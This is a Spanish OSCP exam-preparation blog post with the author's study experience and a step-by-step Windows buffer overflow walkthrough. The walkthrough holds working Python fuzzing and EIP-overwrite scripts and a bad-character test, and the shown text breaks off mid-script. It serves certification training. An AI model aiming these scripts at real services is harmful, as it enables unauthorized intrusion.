---
title: PreparaciÃ³n OSCP
excerpt: "Para aquellos interesados en certificarse de OSCP, por aquÃ­ os dejo una guÃ­a hecha por mi donde de manera desglosada comentamos cada uno de los puntos importantes a tener en cuenta de cara a la examinaciÃ³n."
date: 2020-02-04
classes: wide
header:
  teaser: /assets/images/oscp-preparation/oscp-logo.png
  teaser_home_page: true
categories:
  - Certificaciones
tags:
  - OSCP
  - Offensive Security
  - Pentesting
  - Examen
  - GuÃ­as
---

# PreparaciÃ³n para el OSCP (by s4vitar)

![OSCP Image](http://funkyimg.com/i/2MPB4.png)
#### Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet

<br>
Esta guÃ­a es la misma que tengo publicada en mi Gist:

* [https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e](https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e)

## Ãndice y Estructura Principal
- [Antecedentes - Experiencia Personal](#Antecedentes)
- [Buffer Overflow Windows (25 puntos)](#buffer-overflow-windows)
     * [Fuzzing](#fuzzing)
     * [Calculando el Offset (TamaÃ±o del BÃºffer)](#calculando-el-offset)
     * [Controlando el registro EIP](#controlando-el-registro-eip)
     * [Situando y Asignando Espacio al Shellcode](#situando-y-asignando-espacio-al-shellcode)
     * [Detectando los Badchars](#detectando-los-badchars)
     * [Generando el Shellcode](#generando-el-shellcode)
     * [Salto al ESP (Mona / Immunity Debugger)](#salto-al-esp)
     * [Mejorando el Exploit](#mejorando-el-exploit)
     * [Reduciendo el Size y Acceso por Powershell](#reduciendo-el-size-y-acceso-por-powershell)
- [Buffer Overflow Linux](#buffer-overflow-linux)
     * [Calculando el Offset (Linux)](#calculando-el-offset-en-linux)
     * [Register Enumeration](#register-enumeration)
     * [JMP ESP Opcode](#jmp-esp-opcode)
     * [JMP EAX From ESP](#jmp-eax-from-esp)
     * [Msfvenom Linux Payload](#msfvenom-linux-payload)
     * [Ganando Acceso al Sistema](#ganando-acceso-al-sistema)
     
- [Pentesting](#pentesting)
     * [General](#general)
       * [Port Scanning](#port-scanning)
       * [Wfuzz](#Wfuzz)
       * [Nikto](#Nikto)
       * [EnumeraciÃ³n SNMP](#snmp-enumeration)
       * [Reverse Shell](#reverse-shell)
       * [Spawning a TTY Shell](#spawning-a-tty-shell)
       * [Compilado de Exploits para Windows](#compilado-de-exploits-para-windows)
       * [Squid Proxy](#squid-proxy)
       * [Metasploit Debugging](#metasploit-debugging)
     * [Pentesting Web](#pentesting-web)
       * [LFI (Local File Inclusion)](#lfi)
       * [LFI (Local File Inclusion) Code Examples](#lfi-code-examples)
       * [RFI (Remote File Inclusion)](#rfi)
       * [LFI to RCE](#lfi-to-rce)
       * [LFI to RCE via PHP Sessions](#lfi-to-rce-via-php-sessions)
       * [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-environ)
       * [LFI RFI using Wrappers](#lfi-rfi-using-wrappers) 
       * [SQLI (SQL Inyection)](#sqli)     
       * [Shellshock](#shellshock)
       * [Padding Oracle Attack](#padding-oracle-attack)   
       * [WordPress](#wordpress)
       * [PHP Reverse Shell Manual Multifuncional](#php-reverse-shell-manual-multifuncional)       
       * [ASP/ASPX Reverse Shell](#asp-aspx-reverse-shell)
       * [NoTCPShell](#notcpshell) 
       * [Bypass File Upload Filtering](#bypass-file-upload-filtering)
       * [XML External Entity Injection](#xml-external-entity-injection)
       * [X-Jenkins Remote Code Execution](#x-jenkins)
       * [PHP-CGI Exploitation](#php-cgi-exploitation)
       * [WAF Bypassing](#waf-bypassing)
     * [Pentesting Linux](#pentesting-linux)
        * [Tratamiento de la TTY](#tratamiento-de-la-tty)
        * [Monitorizado de Procesos a Tiempo Real](#process-monitoring)
        * [Escaping Restricted Shell](#escaping-restricted-shell)
        * [Pivoting con Shuttle](#pivoting-con-shuttle)
        * [Port Knocking](#port-knocking)
     * [Pentesting Windows](#pentesting-windows)
        * [Transferencia de Archivos](#transferencia-de-archivos)
        * [EvasiÃ³n de Antivirus con Malware GenÃ©tico](#av-evasion-genetic-malware)
        * [Port Forwarding y TÃ©cnicas de Enrutamiento](#windows-port-forwarding)
        * [Hashdump Manual](#hashdump-manual)
        * [PassTheHash](#passthehash)
        * [Enumeration & Privilege Escalation](#enumeration-and-privilege-escalation)
        * [Powershell Reverse Shell](#powershell-reverse-shell)
        * [MigraciÃ³n manual a proceso a 64 bits](#manual-migration-process)
        * [RCE Filter Evasion Microsoft SQL](#rce-filter-evasion-microsoft-sql)
        * [ConexiÃ³n al Servicio Microsoft SQL con mssqclient.py de Impacket](#mssqlclient-impacket)
        * [Reconocimiento del Sistema](#reconocimiento-del-sistema)
        * [Kernel Exploits Windows](#kernel-exploits-windows)
        * [Privilege Escalation Enumerations](#privilege-escalation-enumerations)

          
Antecedentes
===============================================================================================================================
Antes que nada me gustarÃ­a comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le sirva de inspiraciÃ³n para aquel que pretenda sacarse la certificaciÃ³n.

#### Â¿Es difÃ­cil la certificaciÃ³n?

![Certificado FÃ­sico](http://funkyimg.com/i/2Ptt9.jpg)

DirÃ­a que la respuesta es relativa, siempre va a depender de la soltura que tengas con mÃ¡quinas de tipo _CTF/Challenge_. 

A mi por ejemplo la plataforma **HackTheBox** me ha servido de mucho para coger todo el fondo que tengo a dÃ­a de hoy, asÃ­ como **VulnHub** u **OverTheWire**. De hecho, lo que mÃ¡s me sorprendiÃ³ a la hora de ir haciendo las mÃ¡quinas del laboratorio fue la gran similitud con las mÃ¡quinas de HackTheBox. Hablando en tÃ©rminos comparativos, os puedo decir que efectivamente corresponden a las de nivel medio de HTB, tal y como lleguÃ© a leer en su momento en algunos artÃ­culos de gente que habÃ­a pasado con Ã©xito la certificaciÃ³n.

Eso si, la certificaciÃ³n fue dura, de las mÃ¡s duras que he hecho en mi vida, con mis momentos de desesperaciÃ³n en los que no llegaba a ver las cosas claras, sobre todo por la nueva modalidad **Proctored**, que quieras o no pone un poco nervioso. Mi consejo en este punto es que no tires nunca la toalla, ni aunque quede 1 hora de examen. De hecho, fue justamente 2 horas antes de acabar el examen cuando lo iba a dar todo por perdido hasta que se me ocurriÃ³ un vector de ataque que milagrosamente funcionÃ³ y logrÃ© explotar con Ã©xito comprometiendo otro de los sistemas de la red (con escalada de privilegios incluido).

Para que te quedes tranquilo, si juegas mucho con mÃ¡quinas de tipo CTF y te entrenas dÃ­a a dÃ­a con retos desafiantes que te hagan pensar, no tienes de quÃ© preocuparte.

#### Â¿QuÃ© plan me pillo?

En mi caso me lleguÃ© a pillar el plan de 3 meses, lo que se resume en unos 1.100 euros practicamente. 

Os puedo decir que en 1 mes ya tenÃ­a casi todas las mÃ¡quinas hechas menos 4 de ellas que me siguieron quedando pendientes y no lleguÃ© a hacer (Eran las mÃ¡s Hard y vi que escapaban demasiado de la metodologÃ­a del examen).

El segundo mes lo utilicÃ© para seguir con HackTheBox asÃ­ como para repasar las mÃ¡quinas hechas y probar vÃ­as alternativas de resolver las mismas.

En base a cÃ³mo lo he vivido yo, os recomendarÃ­a mÃ¡s bien 2 meses de laboratorio, sobre todo por lo que me comentaba un gran compaÃ±ero **Julio UreÃ±a**, de que uno tiende a relajarse cuando tiene mucho tiempo por delante.

#### Â¿QuÃ© bases tuve antes de comenzar con la certificaciÃ³n?

A nivel de Pentesting, en VulnHub tenÃ­a 30 mÃ¡quinas, en OverTheWire 6 de los retos principales y en HackTheBox 55 mÃ¡quinas con permisos de administrador en cada una de ellas.

A nivel de Sistemas y programaciÃ³n, con muy buenas bases de Linux Avanzado, programaciÃ³n en Bash Avanzado y ligero tanto de Windows como de Python. SÃ­ que es cierto que la certificaciÃ³n me hizo meterme mÃ¡s a fondo con Windows, asÃ­ como con la programaciÃ³n en Python, de ahÃ­ me motivÃ© de hecho para hacer la herramienta **spoofMe** para el Spoofing de llamadas y mensajerÃ­a instantÃ¡nea. 

A su vez a esto le sumo las auditorÃ­as reales de empresa que hago como Pentester en EnigmaSec, donde el hecho de practicar tambiÃ©n en entornos reales me hace ver las cosas desde otra perspectiva.

Por Ãºltimo, a nivel de BÃºffer Overflow, no sabÃ­a hacer nada... entrÃ© con la mente en blanco a la certificaciÃ³n. Sin embargo, en 4 dÃ­as ya sabÃ­a hacer todos los ejercicios del laboratorio en base a la guÃ­a y a los vÃ­deos de apoyo con los que cuentas en el material que te dan.

#### Â¿QuÃ© horarios de estudio seguÃ­as?

Esto tal vez ha sido lo mÃ¡s mortal, desafiante, doloroso pero a su vez fructÃ­fero. Estuve aplicando **Uberman** durante los 3 meses de preparaciÃ³n, una tÃ©cnica de sueÃ±o polifÃ¡sico que hace que con tan sÃ³lo dormir 3 horas seguidas aplicando posteriormente descansos de 20 minutos a intervalos regulares de tiempo puedas estar activo y despierto (Que no falten los que me conocen de cerca y me llamaban loco).

DecidÃ­ aplicarlo porque bÃ¡sicamente el dÃ­a se pasaba muy rÃ¡pido, cuando uno estÃ¡ trabajando tiene prioridades y debe anteponer las tareas y proyectos frente a lo demÃ¡s. Para poder dedicarle tiempo de estudio al laboratorio, estuve sobre todo el primer mes aplicando a fondo la tÃ©cnica, estudiando y practicando aproximadamente desde las 7 de la tarde hasta las 5 de la maÃ±ana.

He de decir que tambiÃ©n es un gran puÃ±ado de motivaciÃ³n lo que hace que estÃ©s dispuesto a hacer esto, en caso contrario ni lo habrÃ­a intentado. AÃºn asÃ­ no lo recomiendo hacer, pues es perjudicial para la salud, pero dependerÃ¡ de cada cual como pretenda organizarse sus horas de estudio.

#### Â¿QuÃ© pasos me recomiendas para abordar con Ã©xito la certificaciÃ³n?

En primer lugar hacerte una cuenta de **HackTheBox**, incluso te dirÃ­a de pagarte la cuenta VIP para tener acceso a las mÃ¡quinas retiradas. Tienes a tu disposiciÃ³n canales en Youtube como el de **ippsec**, que te explica paso a paso todas las mÃ¡quinas retiradas con tÃ©cnicas bastante chulas tanto de explotaciÃ³n en Windows como en Linux.

Te recomiendo practicar en este tipo de entornos todo lo que puedas, pues son los que te harÃ¡n ver una vez comiences con el laboratorio que hay bastante similitud y que no es tan costoso. Para las mÃ¡quinas del laboratorio, te darÃ¡s cuenta de que los entornos estÃ¡n un poco "deprecated", en el sentido de que son mÃ¡quinas algo antiguas con arquitectura de 32 bits. A la hora de abordar estas mÃ¡quinas, mi consejo es que no trates de explotarlas haciendo uso de exploits modernos, pues estÃ¡n pensadas para que practiques distintas vÃ­as de explotaciÃ³n con tÃ©cnicas no tan actuales, lo que hace que ganes mÃ¡s fondo.

#### Â¿QuÃ© es lo mÃ¡s duro de la certificaciÃ³n?

La gestiÃ³n del tiempo. Mi recomendaciÃ³n y por lo que he escuchado de los demÃ¡s y coincido, es empezar con el BÃºffer Overflow a la hora de abordar el examen. Teniendo cierta soltura no te deberÃ­a de llevar mÃ¡s de 1 hora.

Una vez hecho, ya cuentas con 25 puntos del examen. El siguiente paso es saltar a la mÃ¡quina de 10 puntos, suele ser una explotaciÃ³n rÃ¡pida y directa como administrador del sistema. Con estos 35 puntos bajo la manga, lo mÃ¡s recomendable es dedicarle un buen tiempo a la otra mÃ¡quina de 25 puntos, pues en caso de sacarla, estarÃ­as a 60 puntos y con conseguir el User de alguno de los otros 2 sistemas de 20 puntos ya estarÃ­as aprobado (Intenta aspirar a mÃ¡s y hazlas todas :P).

En cuanto al laboratorio, es justamente el entorno deprecated lo que hace un poco tediosa la compilaciÃ³n y ejecuciÃ³n de exploits, pues en la mayorÃ­a de las veces te darÃ¡ una petada de las importantes. Pero no te frustres, siempre con un poco de cafÃ© y buena actitud se saca.

#### Â¿CuÃ¡les son los siguientes pasos?

Como siempre, uno nunca debe dejar de hacer lo que le gusta... y aÃºn me queda un puÃ±ado de cosas por aprender. SerÃ¡ cuestiÃ³n de seguir aprendiendo lo que harÃ¡ que aparezca una respuesta a esta pregunta.

Sin mÃ¡s, Â¡os dejo con toda la preparaciÃ³n del curso!


Buffer Overflow Windows
===============================================================================================================================
A continuaciÃ³n, se listan los pasos a seguir para la correcta explotaciÃ³n del Buffer Overflow en Windows (32 bits). Para la examinaciÃ³n, no se requieren de conocimientos avanzados de exploiting en BoF (bypassing ASLR, etc.), basta con practicar con servicios bÃ¡sicos y llevar esa misma metodologÃ­a al examen.

Servicios/MÃ¡quinas con los que practicar:

-   SLMail 5.5 
-   Minishare 1.4.1
-   MÃ¡quina Brainpan de VulnHub
-   Los 2 binarios personalizados compartidos en la mÃ¡quina Windows personal del laboratorio

Generalmente, la metodologÃ­a a seguir es la que se describe a continuaciÃ³n.

#### Fuzzing

Para esta fase, es necesario en primer lugar identificar el campo en el que se produce el buffer overflow. Para un caso prÃ¡ctico, suponiendo por ejemplo que un servicio sobre un Host 192.168.1.45 corre bajo el puerto 4000 y que tras la conexiÃ³n vÃ­a TELNET desde nuestra mÃ¡quina, se nos solicita un campo USER a introducir, podemos elaborar el siguiente script en python con el objetivo de determinar si se produce un desbordamiento de bÃºffer:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
  sys.exit(0)

buffer = ["A"]
ipAddress = sys.argv[1]

port = 4000
contador = 100

while len(buffer) < 30:
  buffer.append("A"*contador)
  contador += 200
  
for strings in buffer:
  try:
    print "Enviando %s bytes..." % len(strings)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    s.send("USER " + strings + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print "\nError de conexiÃ³n...\n"
    sys.exit(0)

```
De esta forma, a travÃ©s de una lista, vamos almacenando en la variable **buffer** el caracter "A" un total 30 veces con un incremento para cada una de las iteraciones en 200. 

Esto es:

**[1 caracter "A", 100 caracteres "A", 300 caracteres "A", 500 caracteres "A", 700 caracteres "A", ...]**

Mientras tanto, desde _Immunity Debugger_, estando previamente sincronizados con el proceso, deberemos de utilizarlo como debugger para ver en quÃ© momento se produce una violaciÃ³n de segmento.

Cuando esto ocurra, deberÃ­amos ver como el registro **EIP** toma el valor (**41414141**), correspondiente al caracter "A" en hexadecimal.

Lo bueno de haber creado la lista, es que podemos identificar rÃ¡pidamente entre quÃ© valores se produce el BÃºffer Overflow, en otras palabras, si vemos que tras la ejecuciÃ³n de nuestro script en Python el Ãºltimo reporte que se hizo fue **"Enviando 700 bytes..."**, lo conveniente es modificar nuestro script al siguiente contenido:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
  sys.exit(0)

buffer = "A"*900
ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando bÃºffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexiÃ³n...\n"
  sys.exit(0)

```
Siempre para asegurar es mejor mandarle los 200 caracteres siguientes de nuestro reporte. Tras la ejecuciÃ³n de esta variante, **Immunity Debugger** directamente nos deberÃ­a reportar la violaciÃ³n de segmento con el valor **41414141** en el registro **EIP**, lo cual hace que ya tengamos una aproximaciÃ³n de tamaÃ±o del buffer permitido.

Para que te quedes tranquilo, en el examen te entregarÃ¡n un script en Python a modo de PoC donde se aplica un desbordamiento de bÃºffer sobre el servicio. Contando con esto, es simplemente ir haciendo los pasos que se enumeran a continuaciÃ³n.

#### Calculando el Offset

Dado que el valor 414141 para el EIP no es algo descriptivo que nos permita hacernos la idea de quÃ© tamaÃ±o tiene el buffer permitido, lo que hacemos es aprovecharnos de las utilidades **pattern_create** y **pattern_offset** de Metasploit.

La funcionalidad **pattern_create** nos permitirÃ¡ generar un puÃ±ado de caracteres aleatorios en base a una longitud fijada como criterio. 

Ejemplo:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9
```

Para el ejemplo mostrado, hemos generado 900 bytes de caracteres aleatorios, lo Ãºnico que tendrÃ­amos que hacer es sustituir el caracter "A" de nuestra variable _buffer_ por el contenido que **pattern_create** nos ha devuelto:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
  sys.exit(0)

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando bÃºffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexiÃ³n...\n"
  sys.exit(0)

```

Lo que conseguimos con esto es determinar a travÃ©s del valor del registro **EIP** desde **Immunity Debugger** una vez se produce la violaciÃ³n de segmento, quÃ© caracteres estÃ¡n sobreescribiendo dicho registro.

Supongamos que el registro **EIP** toma este valor tras la detenciÃ³n del servicio una vez producido el desbordamiento:

**EIP -> 39426230**

A fin de realizar su traducciÃ³n y ver quÃ© caracteres de nuestro bÃºffer corresponden a estos valores, podemos aplicar el siguiente comando desde terminal:

```bash
$~ echo "\0x39\0x42\0x62\0x30" | xxd -ps -r

9Bb0

```

Lo que hace que inmediatamente veamos los caracteres a los que corresponden dichos valores. Una vez identificados, podemos a travÃ©s del **pattern_offset** de Metasploit calcular el offset, permitiÃ©ndonos asÃ­ conocer ya el tamaÃ±o del buffer previo a la sobreescritura del registro EIP:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 9Bb0

[*] Exact match at offset 809
```

#### Controlando el registro EIP

Conociendo ya el offset, podemos tomar el control del registro EIP. Dado que el registro **EIP** apunta a la siguiente direcciÃ³n a ejecutar (pues dirige el flujo del programa), poder sobrescribir su valor es crucial para conseguir una ejecuciÃ³n alternativa del servicio a nivel de sistema (lo veremos mÃ¡s adelante).

Dado que el offset es 809, podemos crear el siguiente PoC a fin de verificar que tenemos el control del registro **EIP**:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
  sys.exit(0)

buffer = "A"*809 + "B"*4 + "C"*(900-809-4)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando bÃºffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexiÃ³n...\n"
  sys.exit(0)

```

El caracter "C" lo meto como Padding para hacer relleno hasta llegar a los 900 (para trabajar con cifras redondas).

Tras la ejecuciÃ³n del script, desde el **Immunity Debugger** veremos que una vez se produce la violaciÃ³n de segmento, el registro **EIP** toma el valor **42424242**, equivalente a _"B"*4_. Llegados a este punto, es hora de encontrar el lugar en el que situar nuestro Shellcode.

#### Situando y Asignando Espacio al Shellcode

A la hora de hacer Padding con el caracter "C" tras sobrescribir previamente el registro **EIP**, podremos ver desde el **Immunity Debugger** como el registro **ESP** coincide con nuestro relleno. Llegados a este punto, para el caso que estamos tratando se podrÃ­a decir que nuestro shellcode tendrÃ­a que tener un total de 87 bytes, cosa que escapa de la realidad, pues en la mayorÃ­a de las veces para entablar una conexiÃ³n reversa se generan un total de 351 bytes aproximadamente desde **msfvenom**.

La idea aquÃ­, es rezar 2 padres nuestros para que tras ampliar considerablemente el relleno, el servicio no crashee de otra forma. En caso de "_crashing_" (vamos a llamarlo asÃ­), si vemos que el registro **EIP** ya no vale lo que deberÃ­a, tendremos que ver hasta quÃ© tamaÃ±o podemos hacer relleno sin que el servicio corrompa de otra manera alternativa.

Hay casos como el de Linux que explicarÃ© donde sÃ³lo contamos con 7 bytes de espacio. En ese caso la idea consiste en aprovechar estos 7 bytes para a travÃ©s de 5 bytes definir ciertas instrucciones de desplazamiento y salto entre registros, permitiÃ©ndonos insertar nuestro Shellcode en un nuevo registro donde contamos con el espacio suficiente.

Pero para el caso, y de cara a la examinaciÃ³n... no habrÃ¡ que preocuparse. Modificamos para ello el script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
  sys.exit(0)

buffer = "A"*809 + "B"*4 + "C"*(1300-809-4)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando bÃºffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexiÃ³n...\n"
  sys.exit(0)

```
En este caso ampliamos de forma considerable nuestro relleno, donde tras sobrescribir el registro **EIP**, contamos con un total de 487 bytes de espacio donde los caracteres "C" serÃ¡n situados. En caso de ver desde **Immunity Debugger** que todo figura como lo esperado, podremos quedarnos tranquilos, pues tenemos espacio suficiente para depositar nuestro Shellcode sobre el registro **ESP**.

#### Detectando los Badchars

Esta serÃ¡ la Ãºnica complicaciÃ³n del examen, y cuando digo complicaciÃ³n la sitÃºo entre comillas gestualmente hablando. 

A la hora de generar nuestro Shellcode, existen ciertos caracteres que en funciÃ³n del servicio con el que estemos tratando no son aceptados, causando una ejecuciÃ³n errÃ³nea de las instrucciones que pretendamos inyectar a nivel de sistema.

Detectar estos caracteres no es nada complejo, lo Ãºnico que necesitamos es una estructura como la siguiente:

`"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"`

A fin de detectar cuÃ¡les de estos caracteres no son aceptados por el servicio, configuramos nuestro script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
  sys.exit(0)

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
